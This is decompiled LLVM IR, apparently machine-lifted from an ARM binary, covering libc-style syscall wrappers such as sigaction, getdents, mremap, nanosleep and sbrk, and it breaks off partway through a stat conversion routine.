define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154e0 = load i32, i32* @r7, align 4
  store i32 %v3_154e0, i32* %stack_var_-8, align 4
  %v0_154ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154ec, -4095
  br i1 %tmp, label %dec_label_pc_15514, label %dec_label_pc_154fc

dec_label_pc_154fc:                               ; preds = %entry
  %v0_15500 = call i32 @__aeabi_read_tp()
  %v3_15504 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15504 = sext i16 %v3_15504 to i32
  %v0_15508 = load i32, i32* %r2.global-to-local, align 4
  %v1_15508 = sub i32 0, %v0_15508
  store i32 %v1_15508, i32* %r2.global-to-local, align 4
  %v3_1550c = add i32 %v4_15504, %v0_15500
  %v4_1550c = inttoptr i32 %v3_1550c to i32*
  store i32 %v1_15508, i32* %v4_1550c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15514.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %entry, %dec_label_pc_154fc
  %v1_15518 = phi i32 [ %v0_154ec, %entry ], [ -1, %dec_label_pc_154fc ]
  %v2_15514 = phi i32 [ %v3_154e0, %entry ], [ %v2_15514.pre, %dec_label_pc_154fc ]
  store i32 %v2_15514, i32* @r7, align 4
  ret i32 %v1_15518

; uselistorder directives
  uselistorder i32 %v0_154ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15514, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15558, %dec_label_pc_1556c, %entry
  %v0_1552c = phi i32 [ %arg1, %entry ], [ %v0_1552c.pre.pre, %dec_label_pc_1556c ], [ %v0_15558, %dec_label_pc_15558 ]
  store i32 %v0_1552c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1552c, -4095
  br i1 %tmp, label %dec_label_pc_15558, label %dec_label_pc_15548

dec_label_pc_15548:                               ; preds = %dec_label_pc_1552c
  %v0_15548 = call i32 @__aeabi_read_tp()
  %v0_1554c = load i32, i32* %r2.global-to-local, align 4
  %v1_1554c = sub i32 0, %v0_1554c
  store i32 %v1_1554c, i32* %r2.global-to-local, align 4
  %v3_15550 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15550 = sext i16 %v3_15550 to i32
  %v3_15554 = add i32 %v4_15550, %v0_15548
  %v4_15554 = inttoptr i32 %v3_15554 to i32*
  store i32 %v1_1554c, i32* %v4_15554, align 4
  %v0_15558.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15558

dec_label_pc_15558:                               ; preds = %dec_label_pc_1552c, %dec_label_pc_15548
  %v0_15558 = phi i32 [ %v0_1552c, %dec_label_pc_1552c ], [ %v0_15558.pre, %dec_label_pc_15548 ]
  store i32 %v0_15558, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15558, -4095
  br i1 %tmp4, label %dec_label_pc_1552c, label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %dec_label_pc_15558
  %v0_1556c = call i32 @__aeabi_read_tp()
  %v0_15570 = load i32, i32* %r2.global-to-local, align 4
  %v1_15570 = sub i32 0, %v0_15570
  store i32 %v1_15570, i32* %r2.global-to-local, align 4
  %v3_15574 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15574 = sext i16 %v3_15574 to i32
  %v3_15578 = add i32 %v4_15574, %v0_1556c
  %v4_15578 = inttoptr i32 %v3_15578 to i32*
  store i32 %v1_15570, i32* %v4_15578, align 4
  %v0_1552c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1552c

; uselistorder directives
  uselistorder i32 %v0_15558, { 0, 2, 1 }
  uselistorder i32 %v0_1552c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15558, { 1, 0 }
  uselistorder label %dec_label_pc_1552c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_15590 = load i32, i32* @r1, align 4
  store i32 %v0_15590, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_155a0 = load i32, i32* @r0, align 4
  store i32 %v0_155a0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_155a0, -4095
  br i1 %tmp, label %dec_label_pc_155c8, label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %entry
  %v0_155b0 = call i32 @__aeabi_read_tp()
  %v3_155b4 = load i16, i16* @global_var_2229c.359, align 2
  %v4_155b4 = sext i16 %v3_155b4 to i32
  store i32 %v4_155b4, i32* @r3, align 4
  %v0_155b8 = load i32, i32* @r2, align 4
  %v1_155b8 = sub i32 0, %v0_155b8
  store i32 %v1_155b8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_155c0 = add i32 %v4_155b4, %v0_155b0
  %v4_155c0 = inttoptr i32 %v3_155c0 to i32*
  store i32 %v1_155b8, i32* %v4_155c0, align 4
  br label %dec_label_pc_155d8

dec_label_pc_155c8:                               ; preds = %entry
  store i32 %v0_155a0, i32* %r7.global-to-local, align 4
  %v2_155c8 = icmp eq i32 %v0_155a0, 0
  br i1 %v2_155c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_155c8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_155c8, %bb
  call void @__pseudo_cond_branch(i1 %v2_155c8, i32 ptrtoint (i32* @global_var_15a18.595 to i32))
  br label %dec_label_pc_155d8

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155ac, %.thread
  %v0_155d8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_155d8

; uselistorder directives
  uselistorder i32 %v0_155a0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_155d8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_155ec = load i32, i32* @r5, align 4
  %v18_155ec = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15624, label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %entry
  %v1_1560c = sub i32 0, %arg1
  %v3_15610 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15610 = sext i16 %v3_15610 to i32
  store i32 %v4_15610, i32* %r3.global-to-local, align 4
  %v0_15614 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1561c = add i32 %v4_15610, %v0_15614
  %v4_1561c = inttoptr i32 %v3_1561c to i32*
  store i32 %v1_1560c, i32* %v4_1561c, align 4
  br label %dec_label_pc_15678

dec_label_pc_15624:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15624
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1562c = add i32 %arg2, %arg1
  store i32 %v3_1562c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15624, %bb
  %v1_156684 = phi i32 [ %v18_155ec, %dec_label_pc_15624 ], [ %v3_1562c, %bb ]
  %v0_156642 = phi i32 [ 141, %dec_label_pc_15624 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_15678, label %dec_label_pc_15664

dec_label_pc_15638:                               ; preds = %dec_label_pc_15664
  %v1_1566c = inttoptr i32 %v1_15664 to i8*
  %v1_15638 = add i32 %v0_15638, 8
  %v2_15638 = inttoptr i32 %v1_15638 to i16*
  %v3_15638 = load i16, i16* %v2_15638, align 2
  %v4_15638 = zext i16 %v3_15638 to i32
  %v2_1563c = add i32 %v4_15638, %v0_15638
  store i32 %v2_1563c, i32* @r3, align 4
  %v1_15640 = add i32 %v2_1563c, -1
  %v2_15640 = inttoptr i32 %v1_15640 to i8*
  %v3_15640 = load i8, i8* %v2_15640, align 1
  %v4_15640 = zext i8 %v3_15640 to i32
  store i32 %v4_15640, i32* @r4, align 4
  %v3_15644 = call i32 @strlen(i8* %v1_1566c)
  %v0_15648 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15648, i32* @r1, align 4
  %v1_1564c = add i32 %v3_15644, 1
  store i32 %v1_1564c, i32* @r2, align 4
  %v0_15650 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15650, i32* @r0, align 4
  %v3_15654 = call i32 @memmove(i32 %v0_15650, i32 %v0_15648, i32 %v1_1564c)
  %v0_15658 = load i32, i32* %r7.global-to-local, align 4
  %v1_15658 = add i32 %v0_15658, 8
  %v2_15658 = inttoptr i32 %v1_15658 to i16*
  %v3_15658 = load i16, i16* %v2_15658, align 2
  %v4_15658 = zext i16 %v3_15658 to i32
  store i32 %v4_15658, i32* %r3.global-to-local, align 4
  %v0_1565c = load i32, i32* @r4, align 4
  %v1_1565c = trunc i32 %v0_1565c to i8
  %v3_1565c = add i32 %v0_15658, 10
  %v4_1565c = inttoptr i32 %v3_1565c to i8*
  store i8 %v1_1565c, i8* %v4_1565c, align 1
  %v0_15660 = load i32, i32* %r7.global-to-local, align 4
  %v1_15660 = load i32, i32* %r3.global-to-local, align 4
  %v2_15660 = add i32 %v1_15660, %v0_15660
  store i32 %v2_15660, i32* %r7.global-to-local, align 4
  %v1_15668.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15664

dec_label_pc_15664:                               ; preds = %.thread, %dec_label_pc_15638
  %v1_15668 = phi i32 [ %v1_15668.pre, %dec_label_pc_15638 ], [ %v1_156684, %.thread ]
  %v0_15638 = phi i32 [ %v2_15660, %dec_label_pc_15638 ], [ %v0_156642, %.thread ]
  %v1_15664 = add i32 %v0_15638, 10
  store i32 %v1_15664, i32* %r6.global-to-local, align 4
  %v3_15668 = icmp ult i32 %v0_15638, %v1_15668
  %v1_15670 = add i32 %v0_15638, 11
  store i32 %v1_15670, i32* %r8.global-to-local, align 4
  br i1 %v3_15668, label %dec_label_pc_15638, label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %dec_label_pc_15664, %.thread, %dec_label_pc_15608
  %v0_15678 = load i32, i32* @r5, align 4
  store i32 %v6_155ec, i32* @r5, align 4
  store i32 %v18_155ec, i32* @sl, align 4
  ret i32 %v0_15678

; uselistorder directives
  uselistorder i32 %v1_15664, { 1, 0 }
  uselistorder i32 %v0_15638, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_155ec, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15664, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_15690 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1569c = call i32 @getrlimit(i32 7, i32 %v2_15690)
  %v1_156a0 = icmp slt i32 %v2_1569c, 0
  %v5_156a4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_156a0, i32 256, i32 %v5_156a4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_156c8 = load i32, i32* @r0, align 4
  ret i32 %v1_156c8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_156dc = load i32, i32* @r0, align 4
  ret i32 %v1_156dc
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_156f0 = load i32, i32* @r0, align 4
  ret i32 %v1_156f0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_15700 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 148) to i32*), align 4
  %v1_15704 = inttoptr i32 %v4_15700 to i32*
  %v2_15704 = load i32, i32* %v1_15704, align 4
  %v2_15708 = icmp eq i32 %v2_15704, 0
  br i1 %v2_15708, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_15710 = phi i32 [ %v2_15704, %entry ], [ 4096, %bb ]
  ret i32 %v1_15710

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15748, label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %entry
  %v1_15734 = sub i32 0, %arg1
  %v3_15738 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15738 = sext i16 %v3_15738 to i32
  %v0_1573c = call i32 @__aeabi_read_tp()
  %v3_15740 = add i32 %v4_15738, %v0_1573c
  %v4_15740 = inttoptr i32 %v3_15740 to i32*
  store i32 %v1_15734, i32* %v4_15740, align 4
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %entry, %dec_label_pc_15730
  %v1_1574c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_15730 ]
  ret i32 %v1_1574c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15748, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15754 = load i32, i32* @r7, align 4
  store i32 %v3_15754, i32* %stack_var_-8, align 4
  %v0_15760 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15760, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15760, -4095
  br i1 %tmp, label %dec_label_pc_15788, label %dec_label_pc_15770

dec_label_pc_15770:                               ; preds = %entry
  %v0_15774 = call i32 @__aeabi_read_tp()
  %v3_15778 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15778 = sext i16 %v3_15778 to i32
  store i32 %v4_15778, i32* @r3, align 4
  %v0_1577c = load i32, i32* %r2.global-to-local, align 4
  %v1_1577c = sub i32 0, %v0_1577c
  store i32 %v1_1577c, i32* %r2.global-to-local, align 4
  %v3_15780 = add i32 %v4_15778, %v0_15774
  %v4_15780 = inttoptr i32 %v3_15780 to i32*
  store i32 %v1_1577c, i32* %v4_15780, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15788.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %entry, %dec_label_pc_15770
  %v1_1578c = phi i32 [ %v0_15760, %entry ], [ -1, %dec_label_pc_15770 ]
  %v2_15788 = phi i32 [ %v3_15754, %entry ], [ %v2_15788.pre, %dec_label_pc_15770 ]
  store i32 %v2_15788, i32* @r7, align 4
  ret i32 %v1_1578c

; uselistorder directives
  uselistorder i32 %v0_15760, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15788, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_157a4 = load i32, i32* @r0, align 4
  ret i32 %v1_157a4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_157a8 = load i32, i32* @r4, align 4
  store i32 %v3_157a8, i32* %stack_var_-12, align 4
  %v0_157b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157b8, -4095
  br i1 %tmp, label %dec_label_pc_157e0, label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %entry
  %v0_157cc = call i32 @__aeabi_read_tp()
  %v3_157d0 = load i16, i16* @global_var_2229c.359, align 2
  %v4_157d0 = sext i16 %v3_157d0 to i32
  %v0_157d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157d4 = sub i32 0, %v0_157d4
  store i32 %v1_157d4, i32* %r2.global-to-local, align 4
  %v3_157d8 = add i32 %v4_157d0, %v0_157cc
  %v4_157d8 = inttoptr i32 %v3_157d8 to i32*
  store i32 %v1_157d4, i32* %v4_157d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_157e0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_157e0

dec_label_pc_157e0:                               ; preds = %entry, %dec_label_pc_157c8
  %v1_157e4 = phi i32 [ %v0_157b8, %entry ], [ -1, %dec_label_pc_157c8 ]
  %v2_157e0 = phi i32 [ %v3_157a8, %entry ], [ %v2_157e0.pre, %dec_label_pc_157c8 ]
  store i32 %v2_157e0, i32* @r4, align 4
  ret i32 %v1_157e4

; uselistorder directives
  uselistorder i32 %v0_157b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157e0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157ec = load i32, i32* @r7, align 4
  store i32 %v3_157ec, i32* %stack_var_-8, align 4
  %v0_157f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157f8, -4095
  br i1 %tmp, label %dec_label_pc_15820, label %dec_label_pc_15808

dec_label_pc_15808:                               ; preds = %entry
  %v0_1580c = call i32 @__aeabi_read_tp()
  %v3_15810 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15810 = sext i16 %v3_15810 to i32
  %v0_15814 = load i32, i32* %r2.global-to-local, align 4
  %v1_15814 = sub i32 0, %v0_15814
  store i32 %v1_15814, i32* %r2.global-to-local, align 4
  %v3_15818 = add i32 %v4_15810, %v0_1580c
  %v4_15818 = inttoptr i32 %v3_15818 to i32*
  store i32 %v1_15814, i32* %v4_15818, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15820.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %entry, %dec_label_pc_15808
  %v1_15824 = phi i32 [ %v0_157f8, %entry ], [ -1, %dec_label_pc_15808 ]
  %v2_15820 = phi i32 [ %v3_157ec, %entry ], [ %v2_15820.pre, %dec_label_pc_15808 ]
  store i32 %v2_15820, i32* @r7, align 4
  ret i32 %v1_15824

; uselistorder directives
  uselistorder i32 %v0_157f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1582c = load i32, i32* @r7, align 4
  store i32 %v3_1582c, i32* %stack_var_-8, align 4
  %v0_15838 = load i32, i32* @r0, align 4
  store i32 %v0_15838, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15838, -4095
  br i1 %tmp, label %dec_label_pc_15860, label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %entry
  %v0_1584c = call i32 @__aeabi_read_tp()
  %v3_15850 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15850 = sext i16 %v3_15850 to i32
  %v0_15854 = load i32, i32* %r2.global-to-local, align 4
  %v1_15854 = sub i32 0, %v0_15854
  store i32 %v1_15854, i32* %r2.global-to-local, align 4
  %v3_15858 = add i32 %v4_15850, %v0_1584c
  %v4_15858 = inttoptr i32 %v3_15858 to i32*
  store i32 %v1_15854, i32* %v4_15858, align 4
  %v2_15860.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15860

dec_label_pc_15860:                               ; preds = %entry, %dec_label_pc_15848
  %v1_15864 = phi i32 [ %v0_15838, %entry ], [ -1, %dec_label_pc_15848 ]
  %v2_15860 = phi i32 [ %v3_1582c, %entry ], [ %v2_15860.pre, %dec_label_pc_15848 ]
  store i32 %v2_15860, i32* @r7, align 4
  ret i32 %v1_15864

; uselistorder directives
  uselistorder i32 %v0_15838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15860, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15878 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_1587c = icmp eq i32 %v4_15878, 0
  %v3_15880 = load i32, i32* @r4, align 4
  %v9_15880 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1587c, label %dec_label_pc_15890, label %entry.dec_label_pc_15898_crit_edge

entry.dec_label_pc_15898_crit_edge:               ; preds = %entry
  br label %dec_label_pc_15898

dec_label_pc_15890:                               ; preds = %entry
  store i32 %v3_15880, i32* @r4, align 4
  store i32 %v9_15880, i32* @r6, align 4
  %v0_15894 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_15898

dec_label_pc_15898:                               ; preds = %entry.dec_label_pc_15898_crit_edge, %dec_label_pc_15890
  %v0_15898 = call i32 @__libc_enable_asynccancel()
  %v0_1589c = load i32, i32* @r6, align 4
  store i32 %v0_1589c, i32* @r1, align 4
  store i32 %v0_15898, i32* @r5, align 4
  %v0_158a4 = load i32, i32* @r4, align 4
  store i32 %v0_158a4, i32* @r0, align 4
  %v0_158a8 = call i32 @__syscall_nanosleep()
  store i32 %v0_158a8, i32* @r4, align 4
  %v0_158b0 = load i32, i32* @r5, align 4
  %v1_158b4 = call i32 @__libc_disable_asynccancel(i32 %v0_158b0)
  %v0_158b8 = load i32, i32* @r4, align 4
  ret i32 %v0_158b8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_15898, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_158cc = load i32, i32* @r4, align 4
  store i32 %v3_158cc, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r4.global-to-local, align 4
  %v4_158dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 11576) to i32*), align 4
  %v2_158e0 = icmp eq i32 %v4_158dc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_158e0, label %dec_label_pc_158ec, label %dec_label_pc_158fc

dec_label_pc_158ec:                               ; preds = %entry
  %v1_158f0 = call i32 @__GI_brk(i32 0)
  %v1_158f4 = icmp slt i32 %v1_158f0, 0
  br i1 %v1_158f4, label %dec_label_pc_15920, label %dec_label_pc_158fcthread-pre-split

dec_label_pc_158fcthread-pre-split:               ; preds = %dec_label_pc_158ec
  %v0_15900.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_158fc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_158fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_158fc

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158fcthread-pre-split, %entry
  %v1_158fc = phi i32 [ %v1_158fc.pre, %dec_label_pc_158fcthread-pre-split ], [ 11576, %entry ]
  %v0_158fc = phi i32 [ %v0_158fc.pre, %dec_label_pc_158fcthread-pre-split ], [ ptrtoint (i32* @global_var_22244.363 to i32), %entry ]
  %v1_15910 = phi i32 [ %v0_15900.pr, %dec_label_pc_158fcthread-pre-split ], [ %arg1, %entry ]
  %v2_158fc = add i32 %v0_158fc, %v1_158fc
  %v3_158fc = inttoptr i32 %v2_158fc to i32*
  %v4_158fc = load i32, i32* %v3_158fc, align 4
  %v2_15900 = icmp eq i32 %v1_15910, 0
  store i32 %v4_158fc, i32* %r4.global-to-local, align 4
  br i1 %v2_15900, label %dec_label_pc_15924, label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_158fc
  %v2_15910 = add i32 %v4_158fc, %v1_15910
  %v1_15914 = call i32 @__GI_brk(i32 %v2_15910)
  %v1_15918 = icmp slt i32 %v1_15914, 0
  br i1 %v1_15918, label %dec_label_pc_15920, label %dec_label_pc_1590c.dec_label_pc_15924_crit_edge

dec_label_pc_1590c.dec_label_pc_15924_crit_edge:  ; preds = %dec_label_pc_1590c
  %v0_15924.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15924

dec_label_pc_15920:                               ; preds = %dec_label_pc_1590c, %dec_label_pc_158ec
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15924

dec_label_pc_15924:                               ; preds = %dec_label_pc_158fc, %dec_label_pc_1590c.dec_label_pc_15924_crit_edge, %dec_label_pc_15920
  %v0_15924 = phi i32 [ %v0_15924.pre, %dec_label_pc_1590c.dec_label_pc_15924_crit_edge ], [ -1, %dec_label_pc_15920 ], [ %v4_158fc, %dec_label_pc_158fc ]
  %v2_15928 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15928, i32* @r4, align 4
  ret i32 %v0_15924

; uselistorder directives
  uselistorder i32 %v4_158fc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15924, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15948 = load i32, i32* @r0, align 4
  ret i32 %v1_15948
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1594c = load i32, i32* @r4, align 4
  store i32 %v3_1594c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15964 = inttoptr i32 %arg2 to i8*
  %v4_15964 = call i32 @__GI_memset(i8* %v3_15964, i32 0, i32 104)
  %v2_15968 = load i32, i32* %arg1, align 4
  store i32 %v2_15968, i32* %r3.global-to-local, align 4
  %v3_15968 = add i32 %tmp, 4
  %v4_15968 = inttoptr i32 %v3_15968 to i32*
  %v5_15968 = load i32, i32* %v4_15968, align 4
  store i32 %v5_15968, i32* %r4.global-to-local, align 4
  %v0_1596c = load i32, i32* %r5.global-to-local, align 4
  %v1_1596c = inttoptr i32 %v0_1596c to i32*
  store i32 %v2_15968, i32* %v1_1596c, align 4
  %v3_1596c = add i32 %v0_1596c, 4
  %v4_1596c = inttoptr i32 %v3_1596c to i32*
  %v5_1596c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1596c, i32* %v4_1596c, align 4
  %v0_15970 = load i32, i32* %r6.global-to-local, align 4
  %v1_15970 = add i32 %v0_15970, 12
  %v2_15970 = inttoptr i32 %v1_15970 to i32*
  %v3_15970 = load i32, i32* %v2_15970, align 4
  %v1_15974 = load i32, i32* %r5.global-to-local, align 4
  %v2_15974 = add i32 %v1_15974, 12
  %v3_15974 = inttoptr i32 %v2_15974 to i32*
